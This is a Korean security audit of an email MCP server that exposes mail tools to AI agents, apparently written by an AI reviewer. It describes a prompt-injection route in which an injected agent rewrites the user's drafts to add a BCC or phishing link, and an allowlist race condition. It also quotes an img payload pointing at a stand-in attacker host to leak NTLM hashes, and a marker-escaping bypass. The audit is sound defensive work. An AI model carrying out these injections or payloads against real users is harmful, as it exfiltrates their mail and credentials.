# EmailToMCP P2(MCP 서버) 보안 검토 — Spinoza

검토 범위: 지정된 파일 전부를 Read/Grep으로 읽었습니다. 추가로 설치된 mcp SDK의 transport_security.py 원문, mail/untrusted.py 마커 이스케이프 동작(직접 실행), send_service._build_final_message를 확인했습니다. pytest는 돌리지 않았습니다.

## 결론
- 설계의 뼈대는 대체로 구현돼 있습니다: L1→L2→L3 계층, 단일 writer 기반 원자적 상태 전이, 승인 해시 바인딩, 토큰 해시 저장, HMAC 핸드셰이크.
- 다만 **발송 승인 모델을 우회하는 경로가 2개 있습니다(H-1, H-2).**
- **UI 쪽에 무클릭 공격면이 1개 있습니다(H-3, 실측 확인 필요).**

---

## 검토 요청 사항 1~6 판정

### 1. draft 스코프로 사용자 초안 수정·삭제 — **위험(High), 실제 위협**
- `tools_draft.py:226-260`의 `update_draft`/`delete_draft`는 상태만 확인하고 origin·`mcp_token_id`는 확인 안 함.
- 공격 시나리오(기본 발급 스코프 read+draft만으로 가능): 인젝션 → `list_drafts`로 사용자 초안 탐색 → `update_draft`로 BCC/피싱링크 삽입 → 사용자가 나중에 [보내기] 누르면 `send_draft_now`가 `user_send`로 바로 처리(승인·레이트리밋 없음) → **send 스코프 없이 유출**. 삭제로 가용성 침해도 가능.
- confirm 모드는 안전(승인 도구가 MCP에 없음). **allowlist 모드는 승인 없이 발송됨.**
- 수정 권고: `update_draft`/`delete_draft`/`send_draft`는 `origin=='mcp'` 초안만 허용(가능하면 `mcp_token_id` 일치까지). 사용자 초안 대상 send는 allowlist여도 항상 confirm. §6.3에 origin 제한 명문화.

### 2. 저수준 `Server` API 사용 — **안전**
- list_tools/call_tool 모두 fail-closed, Principal은 서버가 주입한 것만 신뢰(클라이언트 주입 불가), 미등록 도구는 기동 자체를 막음. 계층 약화 없음.
- 문서 불일치만 남음(설계서 §6.1이 아직 MCPServer로 서술).

### 3. L2 Host 거부 421 — **안전**
- SDK 기본값, L1이 이미 걸러낸 뒤에만 도달. 정보 노출 없음.
- 권고(선택): 테스트가 "403 또는 421"을 허용하지 말고 L1 경로에서는 403만 허용하도록 고정(L1 버그를 숨기지 않기 위해).

### 4. 레이트리밋 레이스 — **안전**
- 실제 제어는 단일 writer 트랜잭션 안의 verify 콜백. 두 승인이 동시에 와도 직렬화됨.
- 남은 지적(Low, M-1로 정리): 레이트리밋은 outbox 진입 수만 세고 승인 요청 수는 제한 없음.

### 5. TOCTOU 3중 해시 — **confirm 경로는 안전, allowlist 경로는 위험(H-2)**
- confirm 경로는 스냅샷 해시가 다이얼로그·저장값·현재값 셋 다 일치해야 승인. pending_approval 중엔 모든 편집 SQL이 `status='draft'` 조건이라 변경 불가.
- 권고(Low, 심층방어): `request_approval`/`approve_to_outbox`의 SELECT를 `BEGIN IMMEDIATE` 다음으로 이동.

### 6. Principal의 job 필드 선반영 — **안전**
- 지금은 job 주체를 만드는 경로가 없고 J 도구도 스코프 표에 없음(`get_job_message` 호출 시 403 확인). 악용 가능한 틈 없음.
- P3 요구사항: L3에서 스코프뿐 아니라 principal.kind도 확인, J 도구는 job_id로 대상 고정, 잡 토큰 저장소 분리.

## 심각도별 지적 목록

### High

**H-1. draft 스코프로 사용자 초안을 변조해 send 스코프 없이 유출 가능** — 위 1번.
- 위치: `tools_draft.py:226-260`, `tools_read.py:310-333`, `app.py:734-750`

**H-2. allowlist 모드 TOCTOU: 승인 없이 허용 목록 밖 수신자에게 발송 가능**
- 위치: `tools_send.py:97-111, 148-159`, `approval.py:155-177`
- 원인: `allowlist_permits()` 판정이 **읽기 연결 스냅샷** 기준인데, writer 안 verify는 레이트리밋만 재확인하고 바로 전이함.
- 공격: 허용목록 수신자만 있는 초안으로 `send_draft` 호출 → 판정 후 전이 전 틈에 `update_draft(bcc=[외부])` 끼워넣기(상태가 아직 draft라 성공) → 외부 BCC 포함된 채 승인 없이 outbox行.
- 조건: allowlist 모드(기본값 아님) + 동시 호출.
- 수정: `send_by_policy`의 `_verify`에서 **writer 안의 draft 행으로** allowlist·첨부 여부를 재평가하고 위반 시 PolicyError. 또는 precheck 스냅샷 해시를 넘겨 writer 안에서 대조.

**H-3. 승인 다이얼로그가 비신뢰 문자열을 QLabel AutoText(리치텍스트)로 렌더링 — 무클릭 UNC/NTLM 유출 가능성(실측 필요)**
- 위치: `send_approval_dialog.py:182, 186, 56`. 자동 표시: `main_window.py:1150`.
- 원인: 회신 제목은 공격자 메일 제목 그대로, `create_draft` 제목도 임의 지정 가능(줄바꿈만 막힘). `Qt.AutoText`가 `<img>` 등을 리치텍스트로 해석.
- 영향: `<img src="file://공격자호스트/share/a.png">`가 다이얼로그가 뜨는 순간 SMB 인증(NetNTLM 해시 유출)으로 이어질 수 있음(H5와 같은 유형). 최소한 승인 화면 내용 위장은 확실히 가능.
- 수정: 비신뢰 데이터 표시 QLabel 전부에 `setTextFormat(Qt.TextFormat.PlainText)` 지정(같은 저장소의 `main_window.py:1246` 패턴 재사용). 메인 창 전수 점검 + UNC 로드 여부 실측으로 최종 심각도 확정.

### Medium

**M-1. 승인 요청 폭주: 승인 피로와 UI DoS**
- 위치: `tools_send.py:161-167`, `main_window.py:1173-1194`
- send 토큰으로 초안 N개 생성 후 `send_draft` 반복 → 다이얼로그 N개 연쇄. 거부된 초안도 즉시 재요청 가능. M5(실수 승인) 확률 상승.
- 수정: 토큰별 동시 pending_approval 상한(예: 3건) + 분당 승인요청 상한 + 거부 초안 재요청 쿨다운.

**M-2. allowlist 모드: 첨부 있는 회신·새 초안이 confirm 강제 대상 아님**
- 위치: `tools_send.py:83-87`
- confirm 강제가 forward 종류뿐. 회신 기본 첨부 포함(2026-10-04 결정)과 사용자 `local_file` 첨부가 빠져 있음.
- 수정: allowlist 모드에서 `bool(draft.attachments)`면 항상 confirm. H-2 수정과 함께 writer 안에서 판정.

**M-3. 핸드셰이크가 알려주는 포트 실행 상태가 실제와 어긋날 수 있음**
- 위치: `app.py:1083-1086`, `asgi_host.py:83-106`
- uvicorn이 죽거나 stop() 도중에도 `_state["running"]`이 True로 남아, HMAC 정상 응답이 "닫힌 포트"를 알려줄 수 있음. 다른 로컬 사용자가 그 포트를 먼저 잡으면 프록시가 토큰을 그쪽에 보냄(M2 잔여위험).
- 수정: `current_port()`는 호스트 실제 running일 때만 반환, 종료 콜백으로 상태 즉시 하강, stop()은 소켓 닫기 전 running=False 선행.

### Low
- **L-1**: 단일 인스턴스 파이프·소켓명이 사용자별 아님, `listen()` 결과 미확인. 사칭은 HMAC으로 막힘(토큰 유출 없음), DoS 가능성만. 키에 사용자 SID 포함 권고.
- **L-2**: 감사 거부 상한(분당 30건) — 29건씩 끊어도 회피 안 됨. 대량요청으로 앱 로그(RotatingFileHandler)를 밀어낼 수 있음(포렌식 손실, 토큰 노출은 아님). 창 종료 시 "억제된 거부 N건" 집계 기록 권고.
- **L-3**: 미인증 거부가 `principal=interactive`로 기록(→ `anonymous` 구분 권고), 도구명 길이 제한 없음(128자 제안), `mask_args`가 키 개수 제한 없음(상위 20개+count 권고).
- **L-4**: Host/Origin 검사를 Content-Type보다 앞으로 옮기면 CSRF 시도가 일관되게 "origin/host" 사유로 감사됨(현재는 415로 신호가 흐려짐).
- **L-5**: 비신뢰 마커 이스케이프가 soft hyphen(U+00AD)·동형문자를 못 거름(nonce 모르면 실제 영향 낮음). `_INVISIBLE_RE`에 U+00AD, U+180E, U+034F 추가 권고.
- **L-6**: `fetch_now` 무제한 호출 가능 — 계정별 최소 호출 간격(30초) 권고.
- **L-7**: `update_draft`의 lost update(동시 UI 자동저장과 충돌 가능) — H-1 수정하면 대부분 해소.

## 확인했고 문제없는 항목
- 토큰: 256비트, sha256만 저장, compare_digest, 만료·폐기 즉시 반영, proxy 토큰 keyring 전용.
- L1: POST·단일 Content-Type·1MB 상한·Host 포트까지 정확 비교·Origin 존재 자체 거부(null 포함)·CORS 없음·websocket 거부.
- 소켓: 127.0.0.1 전용, SO_EXCLUSIVEADDRUSE, 포트 자동변경 없음.
- 프록시: trust_env=False, follow_redirects=False, 토큰이 argv/설정파일에 없음.
- 입력 검증: extra=forbid, addr-spec 정규식, 제목 줄바꿈 차단(헤더 인젝션 방지), FTS/LIKE 이스케이프, update.* 설정 보호, 첨부 local_file 경로 MCP 인자 주입 불가.
- 승인 다이얼로그: 기본 [거부], 1.5초 입력잠금, 포커스 안 뺏음, 외부도메인 배지, 본문은 QPlainTextEdit(평문) — H-3의 QLabel만 예외.

## 우선 조치 순서 제안
1. H-1, H-2 수정(Opus 권장).
2. H-3 PlainText 지정 + 메인 창 전수 점검 + UNC 로드 실측.
3. M-1~M-3 처리.
4. Low는 다음 정리 때 일괄.
5. 회귀 테스트 추가: allowlist 경합(send_draft+update_draft 병렬), origin='user' 초안에 draft/send 도구 거부, QLabel textFormat 단언, current_port() 호스트 사망 시 None.
